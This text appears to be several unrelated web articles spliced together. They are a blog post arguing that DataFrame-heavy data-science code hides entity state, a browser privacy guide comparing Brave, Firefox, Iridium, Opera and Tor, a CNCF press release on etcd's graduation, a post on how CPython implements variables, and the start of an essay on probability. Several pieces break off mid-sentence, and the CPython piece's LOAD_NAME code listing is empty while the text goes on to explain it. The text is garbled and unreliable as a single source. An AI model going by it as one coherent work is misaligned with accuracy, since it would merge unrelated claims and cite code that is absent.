  <p>For data scientists, the impetus is more on getting the experiments right, quickly; whatever it takes to achieve that! But the value from data science/machine learning projects comes from their deployment, not modelling experiments.</p>
</blockquote>

<p>This results in code that has bad abstractions. This code is usually propped up with all sorts of hacky engineering practices and put into production.</p>

<p>But if we have to put our finger on one bad abstraction that is pervasive in the data science (engineering) universe and responsible for much of the bad code, it will be state mismanagement.</p>



<p>DataFrames are one of the most ubiquitous and useful data structures, no matter what stack you are using, and they are also very useful to see if a codebase is likely to be bad.</p>

<blockquote>
  <p>If most of the functions in your codebase accept dataframes as input and return dataframes as output, you are likely not modelling the entities correctly and writing hacky code to patch things.</p>
</blockquote>

<h2 id="what-is-state-mismanagement">
What is state mismanagement?</h2>

<p>If you are coming from a traditional programming background, having done webapps or backends or any of the myriad things we do when we code, you’ll be used to creating some kind of abstraction to model the entities involved in your code. A customer, a purchase, a geographic location - any of these could be an entity of interest given the problem we have.</p>

<p>With <a href="https://en.wikipedia.org/wiki/Object-oriented_programming">OOP</a>, you may have created classes to represent and model the state/behaviour of those entities. With <a href="https://en.wikipedia.org/wiki/Functional_programming">FP</a>, you may have focussed more on the state and the transitions those entities go through.</p>

<p>By <strong>state mismanagement</strong>, we refer to the situation when we don’t create these abstractions.</p>

<h2 id="why-state-management-is-important">
Why state management is important?</h2>

<p>These abstractions are very useful. We can write tests against them. We can use them to debug our code. We can persist them and inspect them later when something goes wrong. These abstractions also make code readable - we can follow the state and transitions of entities to understand what is happening. We can also use the <a href="https://en.wikipedia.org/wiki/Type_system">type of these abstractions</a> to debug/reason about our code <a href="https://en.wikipedia.org/wiki/Strong_and_weak_typing">if it is possible</a>.</p>

<h2 id="state-mismanagement-with-dataframes">
State mismanagement with DataFrames</h2>

<p>DataFrames list all observations of an experiment as rows and attributes of those observations as columns. They are similar to the tables in databases we are used to, but most dataframes in a data science project will typically combine many tables (each table typically represents an entity) into a single object (which will represent/hide states of many entities together).</p>

<p>When we don’t explicitly model different entities, our ability to reason about and debug/inspect them gets diminished significantly. We can’t write tests against functions that do things with those entities and their states. Most of our functions will accept dataframes as input and return dataframes as output, and will typically be in violation of the <a href="https://en.wikipedia.org/wiki/SOLID">SOLID principle</a>.</p>

<p>There are, of course, situations where dataframes are the correct solution. But someone not used to thinking about hidden entities and their states may not use them optimally.</p>

<blockquote>
  <p>The habit of including the states of many entities together in a single dataframe is the most prevalent reason for bad code that we have seen.</p>
</blockquote>

<p>When <a href="https://www.thoughtworks.com/insights/blog/coding-practices-data-scientists">we talk about the poor standard of software engineering</a> in data science, we talk a lot about peripheral issues, but incorrect and <a href="https://medium.com/@karpathy/yes-you-should-understand-backprop-e2f06eab496b">leaky abstractions</a> are the main reason why most of the codebase we have seen suck. If you don’t even model your data adequately, how do you become <a href="http://karpathy.github.io/2019/04/25/recipe/#1-become-one-with-the-data">one with the data</a>?</p>

<p>Models doing well in training and poorly in production, whether due to <a href="https://en.wikipedia.org/wiki/Concept_drift">drift</a> or <a href="https://twitter.com/araffin2/status/1329382226421837825">underspecification</a>, is a <a href="https://arxiv.org/abs/2011.03395">real problem</a>. Without the necessary abstractions in place, it becomes very difficult to monitor, detect, and debug issues when they arise.</p>

<p>When we say poor abstractions result in poor code, lack of <a href="https://en.wikipedia.org/wiki/SOLID">SOLID</a>-ness is mostly what we mean. A lot of the hacky software engineering practices we have seen in the wild arise as a consequence.</p>

<h2 id="consequences">
Consequences</h2>

<ul>
  <li>
<strong>Deploying models</strong>: The pattern for consuming data in production is different compared to training. Abstractions created to explore/test/validate data in training can be mostly reused in deployment, and the lack of them hurts greatly.</li>
  <li>
<strong>Writing tests</strong>: It is hard to write meaningful tests if models (datastructures) for the entities in data are not available. This is why we are not seeing more tests in ML even though everyone is talking about them.</li>
  <li>
<strong>Monitoring models</strong>: So your credit default model is starting to perform poorly. Is this across the board, or only for a certain segment for certain entities (geocode, user-acquisition-channel cohort, or month)? Hard to answer this quickly in real-time while your deployed models are falling apart (and losing money) if you have not spent the time and effort to model the data and set up appropriate tests/monitoring.</li>
  <li>
<strong>Reproducibility</strong>: Reproducibility can come in many forms. You may be unable to reproduce the older models during monthly updates (data and hyperparameter versioning is another issue entirely), or the same deep learning-based model may produce different embeddings in a cpu-based deployment server when moved from a gpu-based training server. Without correct abstractions to debug with, you’ll be left wondering what is going wrong.</li>
  <li>
<strong>Commenting and reading code</strong>: Poorly written code with a lot of dataframe needs a lot of documentation, and anyone who has worked in a live codebase knows that good comment coverage is a moving goalpost (moving as the code changes).</li>
</ul>

<p>(Note: If you are working with a Python stack, type-annotation is your friend. If you have to use a lot of <em>any</em> or <em>DataFrame</em> types, you are probably doing it wrong. In a correctly architected codebase, type-annotation can completely replace all forms of commenting and still make reading the codebase a breeze.)</p>



<p>As @seanjtaylor said, <em>there are no hard problems, only slow iterations</em>.</p>

<p>If you have an existing codebase that you think suffers from the issues we outline, start by refactoring small chunks of it (larger chunks will mean slower iterations and you’ll learn slower). If you are starting a new codebase, you can identify and model your entities and <a href="http://karpathy.github.io/2019/04/25/recipe/">be one with your data</a> before you start modeling.</p>

<p>And if you already kaggle, don’t stop. Just recognize that the things in Kaggle that give you dopamine hits should not be the same things that give you dopamine hits when you work on a production system. Hack that dopamine!</p>

      <p>Trying to figure out the starting point when you're beginning your privacy reboot is often the hardest part. You jump online to start your research, punching in "how to increase your privacy" into Google. After 30 minutes of reading an assortment of articles and comments on forums, you end up with more questions than when you started. &nbsp;</p><p>Who do I trust? Who is right? Is there more than one way to do this? Which is better? Why do I need to do this? How is this different than what I'm doing? &nbsp;I've never heard of any of these things, what are they?</p><p>After spending some time considering what someones first step should be, web browsers turned out to make the most sense. Changing your browser requires no money, no specific platform, no technical know how, little set up time, and minimal impact on day to day habits. Things like <a href="https://www.cupwire.com/threat-modeling">figuring out your threat model</a> don't come into play because this is something everyone needs to do at every level.</p><p>What you'll find here is a discussion surrounding 8 specific web browsers, search engines, add-ons, why you should care about which one you use, and suitable options.</p><hr><p>As of October 2020, <a href="https://gs.statcounter.com/browser-market-share/desktop/worldwide/#monthly-202010-202010-bar">Google Chrome is used by roughly 7 out of 10 internet users</a>. Speed, design, branding, and familiarity are a handful of reasons why so many people use Chrome on a day to day basis. But, it all comes at the expense of your data. </p><p>For example, <a href="https://www.google.com/chrome/privacy/whitepaper.html">here's a handful</a> of things <a href="https://www.google.com/chrome/privacy/#privacy-practices-of-apps">Chrome collects.</a></p><ul><li>Chrome sends your original search query, the suggestion you selected, and the position of the suggestion back to Google</li><li>If you've chosen to sync your Chrome history, and if Google is your default search engine, the URL of the page you’re viewing is sent to Google</li><li>Chrome will send a [location] request to google.com each time you start the browser</li><li>Chrome uses your IP address to identify your country or region.</li><li>Desktop versions of Chrome can provide smarter spell-checking by sending text you type into the browser to Google's servers [...]. If this feature is enabled, Chrome sends the entire contents of text fields as you type in them to Google, along with the browser’s default language.</li><li>When you search using the address bar in Chrome, the characters you type (even if you haven’t hit "enter" yet) are sent to your default search engine.</li><li>When you can’t connect to a web page, you can get suggestions for alternative pages similar to the one you're trying to reach. In order to offer you suggestions, Chrome sends Google the URL of the page you're trying to reach.</li><li>Chrome sends Google limited, anonymous information about the web forms that you encounter or submit while Autofill or password management is enabled, including a hashed URL of the web page and details of the form's structure</li></ul><p>To summarize, Chrome can collect your searches, what you typed in the search bar even if you didn't complete the search, the URL of the page your viewing, your location, anything you type into the browser, the URL of pages you tried to go to but didn't load, and data around your web forms used with your auto fill. And remember, this list isn't comprehensive and any/all of this information is merged together with all of the other data Google has in your profile. <a href="https://www.cupwire.com/google-timeline">It isn't exactly like Google has a clean record when it comes to data abuse.</a></p><p>Thankfully, Chrome isn't the only choice available. &nbsp;Costing nothing more than about 15 minutes of your time, installing a new browser and going through the initial setup and settings is the first step to regaining an enormous amount of control over your digital privacy. </p><h2 id="so-which-one">So, which one?</h2><p>The browser market is nothing short of crowded with a mixture of old guards and up and comers. &nbsp;Chrome, Opera, Internet Explorer, Safari, Firefox, Brave, Tor, Chromium, Ungoogled Chromium, IceCat, Waterfox, Iridium, Pale Moon, Vivaldi, Epic, and more are all available and all vying for your attention.</p><p>With so many choices, it's tough to know what the differences are and which options actually respect your privacy. While we aren't going to cover every browser on the market, we're going to talk about 8 of the most commonly discussed browsers on the web.</p><p><em>Side note: this list is in alphabetical order and is not listed "best" to "worst"</em></p><hr><h3 id="brave"><a href="https://brave.com/">Brave</a></h3><p>Brave launched January 2016 as a browser that had a focus on privacy and ethical advertising. &nbsp;The first couple years of its life were spent as an Electron fork but eventually migrated to Google's open source project, Chromium, in 2019.</p><p>Over the years since its inception, Brave has added or enhanced multiple features to reinforce their commitment to privacy, such as better adblocking algorithms for their Shields feature, enhanced fingerprinting protection, and <a href="https://brave.com/tor-tabs-beta/">integrating Tor into their browser when using private tabs and windows.</a></p><p>But, it wasn't long before cracks began to show. <a href="https://www.cupwire.com/brave">Brave has been saddled with controversy after controversy after controversy</a> as the years went on and has lost much of its luster with the privacy community because of this. </p><p>If you're looking for a Chromium based browser, Brave is a decent option after adjusting a few settings but it's no longer respected among the community and comes with multiple asterisks.</p><h3 id="firefox"><a href="https://www.mozilla.org/en-US/firefox/browsers/">Firefox</a></h3><p>Thanks to <a href="https://blog.mozilla.org/firefox/firefox-data-privacy-promise/">Mozilla's commitment to protecting its users</a>, Firefox is often paraded as the best browser for privacy. It's open source, managed by the non-profit <a href="http://www.mozilla.org/en-US/foundation/" rel="noopener noreferrer">Mozilla Foundation</a>, and is at the core of most privacy-focused browsers, such as Tor. Over the years, Firefox has led the charge with implementing privacy first features since they aren't reliant on data collection to stay in business.</p><p><a href="https://blog.mozilla.org/blog/2018/10/23/latest-firefox-rolls-out-enhanced-tracking-protection/">Enhanced tracking protection</a> to help block trackers by default, <a href="https://blog.mozilla.org/futurereleases/2020/06/18/introducing-firefox-private-network-vpns-official-product-the-mozilla-vpn/">partnering with one of the most respected VPNs</a> in the community (<a href="https://mullvad.net/en/">Mullvad</a>) to strengthen your privacy when browsing, <a href="https://www.bleepingcomputer.com/news/software/firefox-59-will-add-a-new-privacy-feature-that-strips-sensitive-data-from-urls/">stripping sensitive information from URLs</a>, enabling <a href="https://arstechnica.com/information-technology/2020/02/firefox-turns-encrypted-dns-on-by-default-to-thwart-snooping-isps/">encrypted DNS by default to prevent snooping</a>, and an <a href="https://privacytools.io/browsers/#about_config">extensive configuration page</a> to further make granular changes are just a handful of features Mozilla has added over the years to guard your privacy. And while some other browsers treat mobile users as second class citizens, if they even serve them at all, Mozilla has been actively working to make sure you're covered not only on the big screen, but on the go as well with <a href="https://en.wikipedia.org/wiki/Firefox_Focus">Firefox Focus</a>.</p><p>However, that's not to say that Firefox hasn't had its fair share of controversy and blunders. In 2014, Mozilla launched a new feature called <a href="https://blog.mozilla.org/advancingcontent/2014/02/11/publisher-transformation-with-users-at-the-center/">Directory Tiles</a>, which later turned into <a href="https://blog.mozilla.org/advancingcontent/2015/05/21/providing-a-valuable-platform-for-advertisers-content-publishers-and-users/">Suggested Tiles</a>, that put ads and sponsored content directly into the Speed Dial. Shortly after, they partnered with Cliqz to <a href="https://www.zdnet.com/article/firefox-tests-cliqz-engine-which-slurps-user-browsing-data/">bundle an add-on that sent your browsing activity back to their servers</a> and a few months after that <a href="https://www.theverge.com/2017/12/16/16784628/mozilla-mr-robot-arg-plugin-firefox-looking-glass">they force installed an add-on without user interaction or permission</a> related to a TV show.</p><p>Even with the handful of questionable decisions, you'll be hard pressed to find a more private way to browse the web for every day use after flipping a few settings.</p><h3 id="iridium"><a href="https://iridiumbrowser.de/">Iridium</a></h3><p>Per Iridium's GitHub</p><blockquote>Iridium is an open modification of the Chromium code base, with privacy being enhanced in several key areas. Automatic transmission of partial queries, keywords, metrics to central services is inhibited and only occurs with consent.</blockquote><p>Iridium is an <a href="https://github.com/iridium-browser/iridium-browser">open source browser</a> based on Chromium but <a href="https://github.com/iridium-browser/tracker/wiki/Differences-between-Iridium-and-Chromium#privacy-enhancements">contains a slew of privacy enhancements turned on by default.</a> This does mean some things don't work, such as <a href="https://iridiumbrowser.de/faq">signing into your Google account and syncing data</a> like you can with Chrome/Chromium, since that would defeat the entire purpose.</p><p>Extensions work just like like they do in Chrome and the general style has a similar feel as well. The only true downside to Iridium is that it can lag behind in updates on certain platforms, sometimes for months. This could be a potential security issue as new vulnerabilities are constantly being patched but most updates are relatively minor.</p><p>If you want an overall solid Chromium browser, Iridium is a great choice.</p><h3 id="opera"><a href="https://www.opera.com/">Opera</a></h3><p>When we're talking about old guards, Opera is sitting at the head of the table. Initially released 25 years ago in 1995, it's one of the oldest browsers still actively developed today. Opera has always been a part of the conversation but, for one reason or another, it's never truly been a first pick choice among users. </p><p>Opera started its life a bit different compared to what you find today. For the first 10 years of its life, Opera was paid commercial software and had its own rendering engine, Presto - which was dropped in 2013 for Chromium. &nbsp;</p><p><a href="https://techcrunch.com/2016/07/18/opera-renegotiates-its-1-2b-sale-down-to-600m-for-browser-privacy-apps-chinese-jv/">In November 2016, the original Norwegian owner sold his stake in Opera Software company to a Chinese consortium named Golden Brick Capital Private Equity Fund I Limited Partnership for $600 million.</a> After word spread that a Chinese group took over Opera (a proprietary browser), concerns sprouted and trust was broken. </p><p>There was already a downward trend in active users at the time and the idea with the sell off was to, beyond getting a pay out, <a href="https://techcrunch.com/2016/02/25/opera-ceo-sale-to-chinese-consortium-wasnt-our-decision/">boost the number of users using the software and grow the ecosystem.</a></p><blockquote>“They have products we don’t have — and they have 500 million users in China, where we are not strong,” Boilesen said.</blockquote><p>In 2016, a <a href="https://www.opera.com/features/free-vpn">built in VPN</a> was released. &nbsp;Concerns rose as it 1) <a href="https://www.opera.com/features/free-vpn"></a><a href="https://gist.github.com/spaze/558b7c4cd81afa7c857381254ae7bd10">turned out to be a proxy and not really a VPN</a> and 2) this free "VPN" was released only a couple months before they were bought out by the Chinese consortium, which lead to worries about user data being funneled to Chinese servers.</p><p>Opera may have helped shape the browser landscape but they have no place in this discussion. There are simply too many asterisks to put this browser anywhere near a recommended section for privacy conscious users and should not be used. &nbsp;</p><h3 id="tor"><a href="https://www.torproject.org/">Tor</a></h3><p>When it comes to privacy, there's currently nothing as accessible and private as Tor. &nbsp;<a href="https://media.torproject.org/video/2015-03-animation/HQ/Tor_Animation_en.mp4">Here's a quick 2 minute video</a> explaining what Tor is and how it's able to achieve such a high level of privacy.</p><p>In short, there's two main ways Tor jumps ahead of other browsers for privacy. First, they automatically make everyone using Tor look the same. When you look exactly like 485,028 other Tor users, you being identified is next to impossible. And second, …</p></div></div>

<p><em>Widely used data store solution for orchestrators has seen </em><em>200 distinct contributors in the past 12 months</em></p>



<p><strong>SAN FRANCISCO, Calif. – November 24, 2020 – </strong><a href="https://www.cncf.io/">The Cloud Native Computing Foundation</a>® (CNCF®), which builds sustainable ecosystems for cloud native software, today announced the graduation of etcd. To move from the maturity level of <a href="https://github.com/cncf/toc/blob/master/process/graduation_criteria.adoc">incubation to graduation</a> etcd has demonstrated growing adoption, an open governance process, feature maturity, and a strong commitment to community, sustainability, and inclusivity.</p>



<p><a href="https://etcd.io/">etcd</a> is a distributed, reliable key-value store and provides a reliable way to store data that needs to be accessed by a distributed system or cluster of machines. Applications of any complexity, from a simple web app to Kubernetes, can read data from and write data into etcd. The project was created at CoreOS in 2013 and joined CNCF in December 2018 as an incubating project.&nbsp;</p>



<p>“The etcd project is a key component inside Kubernetes along with many other projects that depend on etcd for reliable distributed data storage,” said Chris Aniszczyk, CTO of the Cloud Native Computing Foundation. “We remain impressed by the milestones that etcd continues to reach in scale and mature handling of its recent security audit, we look forward to cultivating its community as a graduated project.”</p>



<p>etcd is used in production by <a href="https://github.com/etcd-io/etcd/blob/master/ADOPTERS.md">many companies</a>, including Alibaba, Amazon, Baidu, Cisco, EMC, Google, Huawei, IBM, Red Hat, Uber, Verizon, and more, and projects including Kubernetes, CoreDNS, M3, Rook, and TiKV.</p>



<p>“Having etcd as our meta-store in Placement Driver and our inspiration for Raft implementation in production has proven to be a great choice for TiKV and TiDB, ensuring data consistency and high availability across TiDB clusters,” said Ed Huang, co-founder and CTO at PingCAP. “We are proud and glad to be part of its graduation journey, and we’d love to be involved in its ecosystem development more in the future.”</p>



<p>The <a href="https://github.com/etcd-io/etcd/blob/master/MAINTAINERS">maintainer</a> team currently consists of 10 members, with a healthy distribution of corporations represented, including Alibaba, Amazon, Cockroach Labs, Google Cloud, IBM, Indeed, and Red Hat. Three new maintainers have been added since etcd became an incubating project. Over the last 12 months, 200 distinct contributors have authored pull requests.</p>



<p>“After seven years of development, etcd has reached maturity and become the cornerstone of many distributed systems. The most important decision for its success was joining the CNCF community and growing its maintainers across many organizations,” said Xiang, etcd maintainer, CNCT TOC member, and engineering director at Alibaba Cloud. “We are excited to see its graduation at CNCF. etcd is the centerpiece powering the container service and many other critical services at Alibaba Cloud. We are looking forward to improving its stability, reliability, and performance with the community in the future.”</p>



<p>A third-party <a href="https://www.cncf.io/blog/2020/08/05/etcd-security-audit/">security audit</a> sponsored by CNCF was performed in July 2020 for the latest major release of etcd, v3.4 by Trail of Bits. According to the <a href="https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf">report</a>, the etcd codebase represents a mature and heavily adopted product, and there were no significant issues found in the core components of etcd. One high severity issue was found in the etcd gateway, which the team addressed with fixes and backported into etcd supported releases.&nbsp;</p>



<p>The project also went through Jepsen testing, which analyzes open source distributed systems to check if they fulfill their consistency guarantees, in January 2020. The <a href="https://etcd.io/blog/jepsen-343-results/">results</a> showed maturity in the project functionality. The Jepsen team also pointed out a few areas for improvements, which were implemented by the etcd team.&nbsp;</p>



<p>“From the beginning, etcd was designed to ease consensus store operations, making it attractive for use with container orchestration systems like Kubernetes. etcd’s selection as the control plane storage for Kubernetes proved a great fit, and two projects have grown and matured together,” said Joe Betz, etcd maintainer and software engineer at Google Cloud. “We are excited to see etcd’s dedication toward reliability, scalability, and quality recognized by the CNCF with this graduation. Today’s announcement is a testament to the maturity of etcd and its readiness for production workloads.”&nbsp;</p>



<p>“Today’s major milestone of the graduation of etcd, could not have been accomplished without the work of the community and the support from the CNCF,” said Sahdev Zala, senior software engineer, open technology, IBM and etcd maintainer. “etcd is playing a critical role providing a distributed key-value store that is highly available and meets the strong consistency requirements demanded by large scale Kubernetes clusters.”</p>



<p>“Open source software powers our lives in so many ways,” said Bob Wise, General Manager of Kubernetes at AWS. “From Linux to Kubernetes, open communities of builders from all sizes of organizations and walks of life spend considerable time creating and maintaining projects that underpin much of the internet, telecommunications, finance, transportation, gaming, retail, and healthcare systems we use every day.&nbsp; etcd is one of these critical projects, and we’re proud to have etcd as a core part of Amazon EKS and to be involved in helping the project grow and thrive. We are fervent supporters of etcd’s graduation and look forward to collaborating with etcd and other CNCF projects to build secure, reliable, powerful, and scalable open source software.”</p>



<p>To officially graduate from incubating status, the project was certified for <a href="https://bestpractices.coreinfrastructure.org/en/projects/3192">CII Best Practices Badge</a>, completed security audits and addressed vulnerabilities, defined its own <a href="https://github.com/etcd-io/etcd/blob/master/GOVERNANCE.md">governance</a>, and adopted the <a href="https://github.com/etcd-io/etcd/blob/master/code-of-conduct.md">CNCF Code of Conduct</a>.</p>



<p><strong>etcd Background</strong></p>



<p>etcd is a distributed, reliable key-value store for the most critical data of a distributed system, with a focus on being:</p>



<ul><li>Simple: well-defined, user-facing API (gRPC)</li><li>Secure: automatic TLS with optional client cert authentication</li><li>Fast: benchmarked 10,000 writes/sec</li><li>Reliable: properly distributed using Raft</li></ul>

<!-- /.post-info -->      <p>Consider a simple assignment statement in Python:</p>



<p>The meaning of this statement may seem trivial. What we do here is take the value of the name <code>b</code> and assign it to the name <code>a</code>, but do we really? This is an ambiguous explanation that gives rise to a lot of questions:</p>
<ul>
<li>What does it mean for a name to be associated with a value? What is a value?</li>
<li>What does CPython do to assign a value to a name? To get the value?</li>
<li>Are all variables implemented in the same way?</li>
</ul>
<p>Today we'll answer these questions and understand how variables, so crucial aspect of a programming language, are implemented in CPython.</p>
<p><strong>Note</strong>: In this post I'm referring to CPython 3.9. Some implementation details will certainly change as CPython evolves. I'll try to keep track of important changes and add update notes.</p>
<h2>Start of the investigation</h2>
<p>Where should we start our investigation? We know from the previous parts that to run Python code, CPython compiles it to bytecode, so let's start by looking at the bytecode to which <code>a = b</code> compiles:</p>
<div><pre><span></span>$ echo 'a = b' | python -m dis

  1           0 LOAD_NAME                0 (b)
              2 STORE_NAME               1 (a)
...
</pre></div>


<p><a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/">Last time</a> we learned that the CPython VM operates using the value stack. A typical bytecode instruction pops values from the stack, does something with them and pushes the result of the computation back onto the stack. The <code>LOAD_NAME</code> and <code>STORE_NAME</code> instructions are typical in that respect. Here's what they do in our example:</p>
<ul>
<li><code>LOAD_NAME</code> gets the value of the name <code>b</code> and pushes it onto the stack.</li>
<li><code>STORE_NAME</code> pops the value from the stack and associates the name <code>a</code> with that value.</li>
</ul>
<p>Last time we also learned that all opcodes are implemented in a giant <code>switch</code> statement in <a href="https://github.com/python/cpython/blob/3.9/Python/ceval.c#L1464"><code>Python/ceval.c</code></a>, so we can see how the <code>LOAD_NAME</code> and <code>STORE_NAME</code> opcodes work by studying the corresponding cases of that <code>switch</code>. Let's start with the <code>STORE_NAME</code> opcode since we need to associate a name with some value before we can get the value of that name. Here's the <code>case</code> block that executes the  <code>STORE_NAME</code> opcode: </p>
<div><pre><span></span><span>case</span> <span>TARGET</span><span>(</span><span>STORE_NAME</span><span>)</span><span>:</span> <span>{</span>
    <span>PyObject</span> <span>*</span><span>name</span> <span>=</span> <span>GETITEM</span><span>(</span><span>names</span><span>,</span> <span>oparg</span><span>);</span>
    <span>PyObject</span> <span>*</span><span>v</span> <span>=</span> <span>POP</span><span>();</span>
    <span>PyObject</span> <span>*</span><span>ns</span> <span>=</span> <span>f</span><span>-&gt;</span><span>f_locals</span><span>;</span>
    <span>int</span> <span>err</span><span>;</span>
    <span>if</span> <span>(</span><span>ns</span> <span>==</span> <span>NULL</span><span>)</span> <span>{</span>
        <span>_PyErr_Format</span><span>(</span><span>tstate</span><span>,</span> <span>PyExc_SystemError</span><span>,</span>
                      <span>"no locals found when storing %R"</span><span>,</span> <span>name</span><span>);</span>
        <span>Py_DECREF</span><span>(</span><span>v</span><span>);</span>
        <span>goto</span> <span>error</span><span>;</span>
    <span>}</span>
    <span>if</span> <span>(</span><span>PyDict_CheckExact</span><span>(</span><span>ns</span><span>))</span>
        <span>err</span> <span>=</span> <span>PyDict_SetItem</span><span>(</span><span>ns</span><span>,</span> <span>name</span><span>,</span> <span>v</span><span>);</span>
    <span>else</span>
        <span>err</span> <span>=</span> <span>PyObject_SetItem</span><span>(</span><span>ns</span><span>,</span> <span>name</span><span>,</span> <span>v</span><span>);</span>
    <span>Py_DECREF</span><span>(</span><span>v</span><span>);</span>
    <span>if</span> <span>(</span><span>err</span> <span>!=</span> <span>0</span><span>)</span>
        <span>goto</span> <span>error</span><span>;</span>
    <span>DISPATCH</span><span>();</span>
<span>}</span>
</pre></div>


<p>Let's analyze what it does:</p>
<ol>
<li>The names are strings. They are stored in a code object in a tuple called <code>co_names</code>. The <code>names</code> variable is just a shorthand for <code>co_names</code>. The argument of the <code>STORE_NAME</code> instruction is not a name but an index used to look up the name in <code>co_names</code>.  The first thing the VM does is get the name, which it's going to assign a value to, from <code>co_names</code>.</li>
<li>The VM pops the value from the stack.</li>
<li>Values of variables are stored in a frame object. The <code>f_locals</code> field of a frame object is a mapping from the names of local variables to their values. The VM associates a name <code>name</code> with a value <code>v</code> by setting <code>f_locals[name] = v</code>.</li>
</ol>
<p>We learn from this two crucial facts:</p>
<ul>
<li>Python variables are names mapped to values.</li>
<li>Values of names are references to Python objects.</li>
</ul>
<p>The logic for executing the <code>LOAD_NAME</code> opcode is a bit more complicated because the VM looks up the value of a name not only in <code>f_locals</code> but also in a few other places:</p>
<div><pre><span></span><span>case</span> <span>TARGET</span><span>(</span><span>LOAD_NAME</span><span>)</span><span>:</span> <span>{</span>

<p>This code translates to English as follows:</p>
<ol>
<li>As for the <code>STORE_NAME</code> opcode, the VM first gets the name of a variable.</li>
<li>The VM looks up the value of the name in the mapping of local variables: <code>v = f_locals[name]</code>.</li>
<li>If the name is not in <code>f_locals</code>, the VM looks up the value in the dictionary of global variables <code>f_globals</code>. And if the name is not in <code>f_globals</code> either, the VM looks up the value in <code>f_builtins</code>. The <code>f_builtins</code> field of a frame object points  to the dictionary of the <code>builtins</code> module, which contains built-in types, functions, exceptions and constants. If the name is not there, the VM gives up and sets the <code>NameError</code> exception. </li>
<li>If the VM finds the value, it pushes the value onto the stack.</li>
</ol>
<p>The way the VM searches for a value has the following effects:</p>
<ul>
<li>We always have the names from the <code>builtin</code>'s dictionary, such as <code>int</code>, <code>next</code>, <code>ValueError</code> and <code>None</code>, at our disposal.</li>
<li>
<p>If we use a built-in name for a local variable or a global variable, the new variable will shadow the built-in one.</p>
</li>
<li>
<p>A local variable shadows the global variable with the same name.</p>
</li>
</ul>
<p>Since all we need to be able to do with variables is to associate them with values and to get their values, you might think that the <code>STORE_NAME</code> and <code>LOAD_NAME</code> opcodes are sufficient to implement all variables in Python. This is not the case. Consider the example:</p>
<div><pre><span></span><span>x</span> <span>=</span> <span>1</span>

<span>def</span> <span>f</span><span>(</span><span>y</span><span>,</span> <span>z</span><span>):</span>
    <span>def</span> <span>_</span><span>():</span>
        <span>return</span> <span>z</span>

    <span>return</span> <span>x</span> <span>+</span> <span>y</span> <span>+</span> <span>z</span>
</pre></div>


<p>The function <code>f</code> has to load the values of variables <code>x</code>, <code>y</code> and <code>z</code> to add them and return the result. Note which opcodes the compiler produces to do that:</p>
<div><pre><span></span>$ python -m dis global_fast_deref.py
...
  7          12 LOAD_GLOBAL              0 (x)
             14 LOAD_FAST                0 (y)
             16 BINARY_ADD
             18 LOAD_DEREF               0 (z)
             20 BINARY_ADD
             22 RETURN_VALUE
...
</pre></div>


<p>None of the opcodes are <code>LOAD_NAME</code>. The compiler produces the <code>LOAD_GLOBAL</code> opcode to load the value of <code>x</code>, the <code>LOAD_FAST</code> opcode to load the value of <code>y</code> and the <code>LOAD_DEREF</code> opcode to load the value of <code>z</code>.  To see why the compiler produces different opcodes, we need to discuss two important concepts: namespaces and scopes.</p>
<h2>Namespaces and scopes</h2>
<p>A Python program consists of code blocks. A code block is a piece of code that the VM executes as a single unit. CPython distinguishes three types of code blocks:</p>
<ul>
<li>module</li>
<li>function (comprehensions and lambdas are also functions)</li>
<li>class definition.</li>
</ul>
<p>The compiler creates a code object for every code block in a program. A code object is a structure that describes what a code block does. In particular, it contains the bytecode of a block. To execute a code object, CPython creates a state of execution for it called a frame object. Besides other things, a frame object contains name-value mappings such as <code>f_locals</code>, <code>f_globals</code> and <code>f_builtins</code>. These mappings are referred to as namespaces. Each code block introduces a namespace: its local namespace. The same name in a program may refer to different variables in different namespaces:</p>
<div><pre><span></span><span>x</span> <span>=</span> <span>y</span> <span>=</span> <span>"I'm a variable in a global namespace"</span>

<span>def</span> <span>f</span><span>():</span>
    <span>x</span> <span>=</span> <span>"I'm a local variable"</span>
    <span>print</span><span>(</span><span>x</span><span>)</span>
    <span>print</span><span>(</span><span>y</span><span>)</span>

<span>print</span><span>(</span><span>x</span><span>)</span>
<span>print</span><span>(</span><span>y</span><span>)</span>
<span>f</span><span>()</span>
</pre></div>


<div><pre><span></span>$ python namespaces.py 
I'm a variable in a global namespace
I'm a variable in a global namespace
I'm a local variable
I'm a variable in a global namespace
</pre></div>


<p>Another important notion is the notion of a scope. Here's what the Python documentation <a href="https://docs.python.org/3/tutorial/classes.html#python-scopes-and-namespaces">says about it</a>:</p>
<blockquote>
<p>A <em>scope</em> is a textual region of a Python program where a namespace is directly accessible. “Directly accessible” here means that an unqualified reference to a name attempts to find the name in the namespace.</p>
</blockquote>
<p>We can think about a scope as a property of a name that tells where the value of that name is stored. The example of a scope is a local scope. The scope of a name is relative to a code block. The following example illustrates the point:</p>
<div><pre><span></span><span>a</span> <span>=</span> <span>1</span>

<span>def</span> <span>f</span><span>():</span>
    <span>b</span> <span>=</span> <span>3</span>
    <span>return</span> <span>a</span> <span>+</span> <span>b</span>
</pre></div>


<p>Here, the name <code>a</code> refers to the same variable in both cases. From the function's perspective, it's a global variable, but from the module's perspective, it's both global and local. The variable <code>b</code> is local to the function <code>f</code>, but it doesn't exist at the module level at all.</p>
<p>The variable is considered to be local to a code block if it's bound in that code block. An assignment statement like <code>a = 1</code> binds the name <code>a</code> to <code>1</code>. An assignment statement, though, is not the only way to bind a name. The Python documentation <a href="https://docs.python.org/3/reference/executionmodel.html#naming-and-binding">lists a few more</a>:</p>
<blockquote>
<p>The following constructs bind names: formal …</p></blockquote></div></div>

  <div itemprop="articleBody">
    <p>Today, I want to address an issue with statements involving chance. To demonstrate, let’s first consider a statement that doesn’t involve chance:</p>

<p>“<em>A cubic die tossed onto a flat surface will come to rest on one of its six sides.</em>”</p>

<p>This claim can be empirically tested, with various dice and surfaces. If any one of our experiments results in the die spinning endlessly on a corner, we will have disproven the claim. We may have to refine the claim’s conditions; for instance, by requiring the presence of gravity. Nonetheless, it’s fairly clear what it means for the statement to be true or false. Now let’s try to make a claim involving probability:</p>

<p>“<em>If a pair of standard dice are thrown, the probability of their face-up sides summing to nine will be one in nine (about 0.11 or 11%).</em>”</p>

<p>What does it mean for this statement to be true? Unlike the first statement, this one doesn’t specify which result we’ll actually see. How can we possibly hope to test it, or to make use of its information?</p>



